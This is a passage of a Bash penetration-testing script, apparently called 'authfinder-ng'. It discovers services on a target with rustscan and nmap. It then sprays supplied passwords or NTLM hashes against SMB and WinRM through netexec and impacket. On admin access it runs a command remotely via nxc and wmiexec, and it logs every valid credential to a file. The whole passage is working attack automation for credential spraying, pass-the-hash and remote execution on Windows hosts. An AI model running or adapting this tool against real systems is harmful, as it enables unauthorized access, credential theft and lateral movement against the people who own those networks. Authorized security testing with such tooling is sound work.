# ═══════════════════════════════════════════════════════════════════════════════
# TOOL MANAGEMENT
# ═══════════════════════════════════════════════════════════════════════════════
tool_exists() { command -v "$1" &>/dev/null; }

detect_variants() {
    # nxc / netexec / crackmapexec
    if   tool_exists nxc;            then NXC="nxc"
    elif tool_exists netexec;        then NXC="netexec"
    elif tool_exists crackmapexec;   then NXC="crackmapexec"
    fi

    # xfreerdp3 vs xfreerdp
    if   tool_exists xfreerdp3;      then RDP_BIN="xfreerdp3"; RDP_CERT="/cert:ignore"
    elif tool_exists xfreerdp;       then RDP_BIN="xfreerdp";  RDP_CERT="/cert-ignore"
    fi

    # impacket prefix
    tool_exists impacket-psexec && IMP="impacket-" || IMP=""
}

check_tools() {
    p_hdr "Tool Verification"
    local missing_critical=()

    _chk() {
        local name="$1" bin="$2" level="$3" hint="$4"
        if tool_exists "$bin"; then
            lprint "  ${OK} ${BOLD}${name}${NC}${DIM} (${bin})${NC}"
        else
            if [[ "$level" == "required" ]]; then
                lprint "  ${FAIL} ${BOLD}${name}${NC} — ${LR}NOT FOUND${NC}"
                p_tip "$hint"
                missing_critical+=("$name")
            else
                lprint "  ${WARN} ${DIM}${name} — not found (optional)${NC}"
                p_tip "$hint"
            fi
        fi
    }

    _chk "netexec/nxc"    "${NXC}"        required  "pip install netexec  OR  pipx install netexec"
    _chk "impacket"       "${IMP}psexec"  required  "pip install impacket  OR  pipx install impacket"
    _chk "evil-winrm"     "evil-winrm"    required  "gem install evil-winrm"
    _chk "rustscan"       "rustscan"      optional  "cargo install rustscan  OR  apt install rustscan"
    _chk "nmap"           "nmap"          required  "apt install nmap"
    _chk "hydra"          "hydra"         optional  "apt install hydra"
    _chk "smbclient"      "smbclient"     optional  "apt install smbclient"
    _chk "ldapsearch"     "ldapsearch"    optional  "apt install ldap-utils"
    _chk "xfreerdp"       "$RDP_BIN"      optional  "apt install freerdp2-x11  OR  freerdp3-x11"
    _chk "kerbrute"       "kerbrute"      optional  "go install github.com/ropnop/kerbrute@latest"
    _chk "masscan"        "masscan"       optional  "apt install masscan"
    _chk "proxychains"    "proxychains4"  optional  "apt install proxychains4"

    echo ""
    if [[ ${#missing_critical[@]} -gt 0 ]]; then
        p_warn "Missing required tools: ${missing_critical[*]}"
        p_tip "Run: authfinder-ng --install-tools"
        return 1
    fi
    p_ok "All required tools present"
    return 0
}

install_tools() {
    p_hdr "Installing authfinder-ng dependencies"

    # Update apt silently
    p_info "Updating package lists..."
    sudo apt-get update -qq 2>/dev/null || true

    # apt packages
    for pkg in nmap smbclient ldap-utils hydra masscan proxychains4; do
        if ! tool_exists "$pkg"; then
            p_info "Installing ${pkg}..."
            sudo apt-get install -y -qq "$pkg" 2>/dev/null && p_ok "$pkg installed" || p_warn "$pkg failed"
        else
            p_ok "$pkg already installed"
        fi
    done

    # xfreerdp3 preferred
    if ! tool_exists xfreerdp3 && ! tool_exists xfreerdp; then
        p_info "Installing freerdp3..."
        sudo apt-get install -y -qq freerdp3-x11 2>/dev/null || \
        sudo apt-get install -y -qq freerdp2-x11 2>/dev/null || true
    fi

    # netexec via pipx
    if ! tool_exists nxc && ! tool_exists netexec; then
        p_info "Installing netexec..."
        if tool_exists pipx; then
            pipx install netexec 2>/dev/null && p_ok "netexec installed" || true
        fi
        if ! tool_exists nxc && ! tool_exists netexec; then
            pip3 install netexec 2>/dev/null && p_ok "netexec installed" || p_warn "netexec install failed — try manually"
        fi
    fi

    # impacket
    if ! tool_exists impacket-psexec; then
        p_info "Installing impacket..."
        if tool_exists pipx; then
            pipx install impacket 2>/dev/null && p_ok "impacket installed" || true
        fi
        if ! tool_exists impacket-psexec; then
            pip3 install impacket 2>/dev/null || p_warn "impacket install failed"
        fi
    fi

    # evil-winrm
    if ! tool_exists evil-winrm; then
        p_info "Installing evil-winrm..."
        gem install evil-winrm 2>/dev/null && p_ok "evil-winrm installed" || p_warn "gem install failed — ensure ruby+gem installed"
    fi

    # rustscan
    if ! tool_exists rustscan; then
        p_info "Installing rustscan..."
        sudo apt-get install -y -qq rustscan 2>/dev/null || \
        cargo install rustscan 2>/dev/null || \
        p_warn "rustscan not installed — nmap fallback will be used"
    fi

    echo ""
    p_ok "Setup complete. Re-run authfinder-ng."
    exit 0
}

# ═══════════════════════════════════════════════════════════════════════════════
# CACHE SYSTEM
# ═══════════════════════════════════════════════════════════════════════════════
cache_file()  { echo "${CACHE_DIR}/${1//./_}.cache"; }

cache_save() {
    local ip="$1" hostname="$2" domain="$3"
    shift 3
    local services=("$@")   # "proto:port:service_name" ...
    mkdir -p "$CACHE_DIR"
    local cf; cf=$(cache_file "$ip")
    {
        echo "CACHE_IP=\"${ip}\""
        echo "CACHE_TIME=$(date +%s)"
        echo "CACHE_HOSTNAME=\"${hostname}\""
        echo "CACHE_DOMAIN=\"${domain}\""
        echo "CACHE_SERVICES=\"${services[*]}\""
    } > "$cf"
    p_dbg "Cache saved: $cf"
}

cache_load() {
    # Exports: CACHE_IP CACHE_TIME CACHE_HOSTNAME CACHE_DOMAIN CACHE_SERVICES
    local ip="$1"
    local cf; cf=$(cache_file "$ip")
    [[ -f "$cf" ]] && source "$cf" && return 0 || return 1
}

cache_valid() {
    local ip="$1"
    $RESCAN && return 1
    cache_load "$ip" || return 1
    local now; now=$(date +%s)
    local age=$(( now - CACHE_TIME ))
    [[ $age -lt $CACHE_TTL ]]
}

cache_age_str() {
    local secs=$(( $(date +%s) - CACHE_TIME ))
    if   (( secs < 120  )); then echo "${secs}s ago"
    elif (( secs < 3600 )); then echo "$(( secs/60 ))m ago"
    elif (( secs < 86400)); then echo "$(( secs/3600 ))h ago"
    else                         echo "$(( secs/86400 ))d ago"; fi
}

# ═══════════════════════════════════════════════════════════════════════════════
# PORT DISCOVERY & SERVICE MAPPING
# ═══════════════════════════════════════════════════════════════════════════════

# Map nmap service/product → our protocol name
map_service() {
    local port="$1" service="$2" product="$3"
    local svc="${service,,}" prod="${product,,}"

    # Well-known port overrides (highest confidence)
    case "$port" in
        22)          echo "ssh";      return ;;
        21)          echo "ftp";      return ;;
        445)         echo "smb";      return ;;
        3389)        echo "rdp";      return ;;
        1433)        echo "mssql";    return ;;
        3306)        echo "mysql";    return ;;
        5432)        echo "postgres"; return ;;
        5900|5901)   echo "vnc";      return ;;
        389|3268)    echo "ldap";     return ;;
        636|3269)    echo "ldap";     return ;;
        5985|47001)  echo "winrm";    return ;;
        5986)        echo "winrm";    return ;;
        25|465|587)  echo "smtp";     return ;;
        80)          echo "http";     return ;;
        443|8443)    echo "https";    return ;;
        8080|8888)   echo "http";     return ;;
    esac

    # Service name matching
    case "$svc" in
        microsoft-ds|smb*)              echo "smb";    return ;;
        ms-wbt-server|rdp*)             echo "rdp";    return ;;
        ms-sql-s|mssql*)                echo "mssql";  return ;;
        ssh|openssh*)                   echo "ssh";    return ;;
        ftp|ftpd*)                      echo "ftp";    return ;;
        ldap)                           echo "ldap";   return ;;
        vnc)                            echo "vnc";    return ;;
        msrpc|ms-rpc)                   echo "wmi";    return ;;
        http|https|http-alt|https-alt)  echo "http";   return ;;
    esac

    # Product string (catches WinRM on non-standard ports, etc.)
    echo "$prod" | grep -qi "winrm\|httpapi\|wsman\|ms-wsman"  && { echo "winrm";  return; }
    echo "$prod" | grep -qi "microsoft-ds\|samba\|smbd"        && { echo "smb";    return; }
    echo "$prod" | grep -qi "remote desktop\|terminal service" && { echo "rdp";    return; }
    echo "$prod" | grep -qi "sql server\|mssql\|sqlservr"      && { echo "mssql";  return; }
    echo "$prod" | grep -qi "openssh\|dropbear\|bitvise"       && { echo "ssh";    return; }
    echo "$prod" | grep -qi "proftpd\|vsftpd\|wu-ftpd\|filezilla" && { echo "ftp"; return; }
    echo "$prod" | grep -qi "apache\|nginx\|iis\|lighttpd"     && { echo "http";   return; }

    echo "unknown"
}

# Parse nmap normal output → array of "proto:port:service:product"
parse_nmap() {
    local nmap_out="$1"
    local -a found=()

    while IFS= read -r line; do
        # Match lines like: 445/tcp   open  microsoft-ds  Windows Server 2019 ...
        [[ "$line" =~ ^([0-9]+)/tcp[[:space:]]+open[[:space:]]+([^[:space:]]+)[[:space:]]*(.*) ]] || continue
        local port="${BASH_REMATCH[1]}"
        local svc="${BASH_REMATCH[2]}"
        local prod="${BASH_REMATCH[3]}"
        # Clean up "?" suffixes from nmap
        svc="${svc/\?/}"
        local proto; proto=$(map_service "$port" "$svc" "$prod")
        [[ "$proto" == "unknown" ]] && continue
        found+=("${proto}:${port}:${svc}")
        p_dbg "Mapped port ${port} (${svc}) → ${proto}"
    done <<< "$nmap_out"

    printf '%s\n' "${found[@]}"
}

# Full discovery: rustscan → nmap -sV → service map → cache
discover_target() {
    local ip="$1"
    local -a services=()
    local auto_hostname="" auto_domain=""

    p_hdr "Discovery — ${ip}"

    # Check cache first
    if cache_valid "$ip"; then
        cache_load "$ip"
        local age; age=$(cache_age_str)
        p_info "Loaded cached scan for ${BOLD}${ip}${NC} ${DIM}(${age}) — use --rescan to refresh${NC}"
        [[ -n "$CACHE_HOSTNAME" ]] && p_info "Hostname: ${BOLD}${CACHE_HOSTNAME}${NC}"
        [[ -n "$CACHE_DOMAIN"   ]] && p_info "Domain  : ${BOLD}${CACHE_DOMAIN}${NC}"
        p_info "Services: ${BOLD}${CACHE_SERVICES}${NC}"
        IFS=' ' read -ra services <<< "$CACHE_SERVICES"
        printf '%s\n' "${services[@]}"
        return 0
    fi

    local open_ports=""
    local nmap_out=""

    if $SKIP_SCAN; then
        p_warn "Scan skipped (--skip-scan) — using all default tool ports"
        # Return default service entries
        local defaults=(smb:445:microsoft-ds winrm:5985:http wmi:135:msrpc rdp:3389:ms-wbt-server mssql:1433:ms-sql-s ssh:22:ssh ftp:21:ftp ldap:389:ldap)
        printf '%s\n' "${defaults[@]}"
        return 0
    fi

    # Phase 1: fast port discovery
    if tool_exists rustscan; then
        p_info "Running rustscan on all 65535 ports..."
        p_cmd_display "rustscan -a ${ip} --ulimit 5000 -b 2500 --no-nmap 2>/dev/null"
        local rs_out
        rs_out=$(rustscan -a "$ip" --ulimit 5000 -b 2500 --no-nmap 2>/dev/null) || true
        open_ports=$(echo "$rs_out" | grep -oP '^\d+' | sort -un | tr '\n' ',' | sed 's/,$//')
        p_dbg "rustscan found ports: ${open_ports:-none}"
    fi

    if [[ -z "$open_ports" ]]; then
        p_info "rustscan unavailable / no results — falling back to nmap top-ports..."
        p_cmd_display "nmap -sV --open --top-ports 2000 -T4 ${ip} 2>/dev/null"
        nmap_out=$(nmap -sV --open --top-ports 2000 -T4 "$ip" 2>/dev/null) || true
    else
        # Phase 2: nmap service fingerprint on discovered ports
        p_info "Running nmap service detection on open ports..."
        p_cmd_display "nmap -sV --open -T4 -p ${open_ports} ${ip} 2>/dev/null"
        nmap_out=$(nmap -sV --open -T4 -p "$open_ports" "$ip" 2>/dev/null) || true
    fi

    if [[ -z "$nmap_out" ]]; then
        p_fail "Discovery failed — no nmap output. Check connectivity."
        return 1
    fi

    # Extract hostname & domain from nmap + SMB banner
    auto_hostname=$(echo "$nmap_out" | grep -oP 'Nmap scan report for \K[^\s(]+' | head -1)
    [[ "$auto_hostname" == "$ip" ]] && auto_hostname=""

    # Run a quick SMB banner grab if port 445 found (extracts domain automatically)
    if echo "$nmap_out" | grep -q "445/tcp.*open"; then
        p_info "Grabbing SMB banner for domain/hostname detection..."
        local smb_banner
        smb_banner=$(timeout 8 "$NXC" smb "$ip" 2>/dev/null | head -5) || true
        p_dbg "SMB banner: $smb_banner"
        local detected_domain detected_host
        detected_domain=$(echo "$smb_banner" | grep -oP '\(domain:[^)]+\)' | grep -oP '[^:()\s]+$' | head -1)
        detected_host=$(echo "$smb_banner"   | grep -oP '\(name:[^)]+\)'   | grep -oP '[^:()\s]+$' | head -1)
        [[ -n "$detected_domain" ]] && auto_domain="$detected_domain"   && p_ok "Domain   auto-detected: ${BOLD}${auto_domain}${NC}"
        [[ -n "$detected_host"   ]] && auto_hostname="$detected_host"   && p_ok "Hostname auto-detected: ${BOLD}${auto_hostname}${NC}"
    fi

    # Auto-set domain if not supplied
    [[ -z "$DOMAIN" && -n "$auto_domain" ]] && {
        DOMAIN="$auto_domain"
        p_info "Using detected domain: ${BOLD}${DOMAIN}${NC} (override with -d)"
    }

    # Add to /etc/hosts if requested
    if $ADD_TO_HOSTS && [[ -n "$auto_hostname" ]]; then
        if ! grep -q "$auto_hostname" /etc/hosts 2>/dev/null; then
            echo "${ip}  ${auto_hostname}" | sudo tee -a /etc/hosts >/dev/null && \
                p_ok "Added to /etc/hosts: ${ip}  ${auto_hostname}"
        fi
    fi

    # Parse services from nmap output
    mapfile -t services < <(parse_nmap "$nmap_out")

    if [[ ${#services[@]} -eq 0 ]]; then
        p_warn "No recognizable services found on ${ip}"
        return 1
    fi

    p_ok "Services found: ${BOLD}${services[*]}${NC}"

    # Save to cache
    cache_save "$ip" "${auto_hostname}" "${auto_domain}" "${services[@]}"

    printf '%s\n' "${services[@]}"
}

# ═══════════════════════════════════════════════════════════════════════════════
# CREDENTIAL HELPERS
# ═══════════════════════════════════════════════════════════════════════════════
is_hash() {
    local h="${1#:}"; h="${h//\'/}"; h="${h// /}"
    [[ ${#h} -eq 32 ]] && [[ "$h" =~ ^[0-9a-fA-F]+$ ]]
}

# Build NXC auth flags: "-u user -p pass" or "-u user -H hash" + optional domain/local-auth
nxc_auth() {
    local user="$1" cred="$2" is_hash="$3"
    local out="-u '${user}'"
    if [[ "$is_hash" == "1" ]]; then
        local h="${cred#:}"; h="${h//\'/}"
        out+=" -H '${h}'"
    else
        out+=" -p '${cred}'"
    fi
    [[ -n "$DOMAIN" ]]            && out+=" -d '${DOMAIN}'"
    [[ "$LOCAL_AUTH" == "true" ]] && out+=" --local-auth"
    echo "$out"
}

# Build impacket auth prefix: "DOMAIN/user:pass@ip" or "-hashes :HASH DOMAIN/user@ip"
imp_auth() {
    local user="$1" cred="$2" is_hash="$3" ip="$4"
    local dp="${DOMAIN:+${DOMAIN}/}"
    if [[ "$is_hash" == "1" ]]; then
        local h="${cred#:}"; h="${h//\'/}"
        echo "-hashes :${h} '${dp}${user}'@${ip}"
    else
        echo "'${dp}${user}':'${cred}'@${ip}"
    fi
}

# Get impacket binary name (impacket-psexec or psexec.py)
imp() { echo "${IMP}${1}"; }

# nxc custom port flag
nxc_port() {
    local default="$1" actual="$2"
    [[ "$actual" != "$default" ]] && echo "--port ${actual}" || echo ""
}

# ═══════════════════════════════════════════════════════════════════════════════
# RECORDING (thread-safe)
# ═══════════════════════════════════════════════════════════════════════════════
record_hit() {
    local ip="$1" proto="$2" port="$3" user="$4" cred="$5" is_hash="$6" is_admin="$7"
    ( flock -x 200
      echo "${ip}|${proto}|${port}|${user}|${cred}|${is_hash}|${is_admin}" >> "$HITS_FILE"
    ) 200>"$LOCK_FILE"
}

record_auth_only() {
    local ip="$1" proto="$2" port="$3" user="$4" cred="$5"
    ( flock -x 200
      grep -q "^${ip}|${proto}|.*|${user}|" "$AUTH_FILE" 2>/dev/null && return
      echo "${ip}|${proto}|${port}|${user}|${cred}" >> "$AUTH_FILE"
    ) 200>"$LOCK_FILE"
}

record_fail() {
    local user="$1"
    ( flock -x 200
      echo "$user" >> "$FAIL_FILE"
      local cnt; cnt=$(grep -c "^${user}$" "$FAIL_FILE" 2>/dev/null || echo 0)
      if (( cnt >= LOCKOUT_THRESH )); then
          echo -e "${LR}${BOLD}  [LOCKOUT RISK] '${user}' failed ${cnt}x — pausing spray!${NC}"
          echo -e "    ${Y}Run: ${NXC} smb TARGET -u '${user}' -p '' --pass-pol${NC}"
          sleep 5
      fi
    ) 200>"$LOCK_FILE"
}

fail_count() {
    [[ -f "$FAIL_FILE" ]] && grep -c "^${1}$" "$FAIL_FILE" 2>/dev/null || echo 0
}

# ═══════════════════════════════════════════════════════════════════════════════
# ERROR ADVISOR
# ═══════════════════════════════════════════════════════════════════════════════
analyze_error() {
    local proto="$1" out="$2" ip="$3" user="$4"
    echo "$out" | grep -qi "STATUS_LOGON_FAILURE\|wrong password\|Logon failure\|invalid credential" && {
        lprint "    ${WARN} Wrong credentials for '${user}' @ ${ip}"; return; }
    echo "$out" | grep -qi "ACCOUNT_LOCKED_OUT\|account.*lock" && {
        p_sec "LOCKOUT: '${user}' is LOCKED on ${ip} — STOP!"; return; }
    echo "$out" | grep -qi "ACCOUNT_DISABLED" && {
        p_warn "Account DISABLED: '${user}' on ${ip}"; return; }
    echo "$out" | grep -qi "PASSWORD_EXPIRED\|MUST_CHANGE" && {
        p_warn "Password EXPIRED for '${user}' — needs interactive change"; return; }
    echo "$out" | grep -qi "STATUS_ACCESS_DENIED\|access.denied" && {
        p_warn "Creds VALID but not local admin (${proto}) on ${ip}"
        [[ "$LOCAL_AUTH" == "false" ]] && p_tip "Try --local-auth for local accounts"
        return; }
    echo "$out" | grep -qi "Clock skew\|KRB_AP_ERR_SKEW" && {
        p_warn "Kerberos clock skew — fix with: sudo ntpdate ${ip}"; return; }
    echo "$out" | grep -qi "KDC_ERR_C_PRINCIPAL_UNKNOWN" && {
        p_fail "Kerberos: user '${user}' not found in domain"; return; }
    echo "$out" | grep -qi "Connection refused\|ECONNREFUSED\|timed out\|unreachable" && {
        p_warn "${proto} port closed or filtered on ${ip}"; return; }
    echo "$out" | grep -qi "SMB.*signing" && {
        p_warn "SMB signing required — relay won't work but auth still possible"; return; }
}

# ═══════════════════════════════════════════════════════════════════════════════
# PROTOCOL TESTERS
# Each returns: 0=exec_success  1=fail  2=auth_only_confirmed
# ═══════════════════════════════════════════════════════════════════════════════

# Helper: run a command, show output, return exit code
_run() {
    local cmd="$1" tmo="${2:-$TIMEOUT}"
    local out rc=0
    p_cmd_display "$cmd"
    out=$(eval "timeout ${tmo} ${PROXYCHAINS} ${cmd}" 2>&1) || rc=$?
    show_output "$out"
    LAST_OUT="$out"
    LAST_RC="$rc"
    return $rc
}

# ── SMB ────────────────────────────────────────────────────────────────────────
test_smb() {
    local ip="$1" port="$2" user="$3" cred="$4" is_hash="$5"
    local af; af=$(nxc_auth "$user" "$cred" "$is_hash")
    local pf; pf=$(nxc_port 445 "$port")
    local label="SMB:${port}"

    lprint "\n  ${STEP} ${BOLD}${label}${NC}"

    # Auth check
    _run "${NXC} smb ${ip} ${pf} ${af}" "$TIMEOUT" || true

    if echo "$LAST_OUT" | grep -q "Pwn3d!"; then
        p_hit "${label} — ${user}@${ip} — ${LG}LOCAL ADMIN${NC}"
        record_hit "$ip" "smb" "$port" "$user" "$cred" "$is_hash" "admin"

        # Prove execution
        _run "${NXC} smb ${ip} ${pf} ${af} -x '${EXEC_CMD}'" "$TIMEOUT" || true

        # Also run impacket-wmiexec for interactive shell proof
        if tool_exists "$(imp wmiexec)"; then
            local ia; ia=$(imp_auth "$user" "$cred" "$is_hash" "$ip")
            local wmi_port_flag=""
            _run "$(imp wmiexec) ${ia} '${EXEC_CMD}'" "$TIMEOUT" || true
        fi
        return 0

    elif echo "$LAST_OUT" | grep -q "\[+\]"; then
        lprint "  ${AUTH} ${label} — ${user}@${ip} — creds VALID, not local admin"
        record_auth_only "$ip" "smb" "$port" "$user" "$cred"
        return 2
    else
        analyze_error "smb" "$LAST_OUT" "$ip" "$user"
        return 1
    fi
}

# ── WinRM ──────────────────────────────────────────────────────────────────────
test_winrm() {
    local ip="$1" port="$2" user="$3" cred="$4" is_hash="$5"
    local af; af=$(nxc_auth "$user" "$cred" "$is_hash")
    local pf; pf=$(nxc_port 5985 "$port")
    local ssl_flag=""
    [[ "$port" == "5986" ]] && ssl_flag="--ssl"
    local label="WinRM:${port}"

    lprint "\n  ${STEP} ${BOLD}${label}${NC}"

    _run "${NXC} winrm ${ip} ${pf} ${ssl_flag} ${af} -x '${EXEC_CMD}'" "$WINRM_TO" || true

    if echo "$LAST_OUT" | grep -qi "Pwn3d!\|\[+\].*Success"; then
        p_hit "${label} — ${user}@${ip} — ${LG}ACCESS${NC}"
        local is_admin="no"
        echo "$LAST_OUT" | grep -q "Pwn3d!" && is_admin="admin"
        record_hit "$ip" "winrm" "$port" "$user" "$cred" "$is_hash" "$is_admin"
        return 0

    elif echo "$LAST_OUT" | grep -q "\[+\]"; then
        lprint "  ${AUTH} ${label} — ${user}@${ip} — creds valid"
        record_auth_only "$ip" "winrm" "$port" "$user" "$cred"
        return 2

    elif echo "$LAST_OUT" | grep -qi "WinRMAuthorizationError\|Unauthorized\|401\|refused"; then
        lprint "  ${FAIL} ${label} auth rejected"
        [[ -z "$DOMAIN" ]] && p_tip "Try with -d DOMAIN"
        p_tip "User must be in 'Remote Management Users' or Administrators"
        return 1
    else
        analyze_error "winrm" "$LAST_OUT" "$ip" "$user"
        return 1
    fi
}

